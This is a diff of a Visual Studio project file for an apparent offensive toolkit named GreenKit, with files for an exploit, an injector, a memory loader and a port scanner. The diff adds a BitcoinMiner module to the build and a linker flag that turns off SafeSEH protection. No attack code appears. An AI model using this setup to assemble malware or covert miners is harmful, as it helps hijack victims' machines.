@@ -60,6 +60,7 @@
     <Link>
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalOptions>/SAFESEH[:NO] %(AdditionalOptions)</AdditionalOptions>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
@@ -85,6 +86,7 @@
   <ItemGroup>
     <ClInclude Include="..\GreenKit\utils.h" />
     <ClInclude Include="MyExploit.h" />
+    <ClInclude Include="BitcoinMiner.h" />
     <ClInclude Include="GreenKitExe.h" />
     <ClInclude Include="Injector.h" />
     <ClInclude Include="MemoryModule.h" />
@@ -96,6 +98,7 @@
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="..\GreenKit\PortScan.cpp" />
+    <ClCompile Include="..\GreenKit\BitcoinMiner.cpp" />
     <ClCompile Include="..\GreenKit\utils.cpp" />
     <ClCompile Include="MyExploit.cpp" />
     <ClCompile Include="GreenKitExe.cpp" />
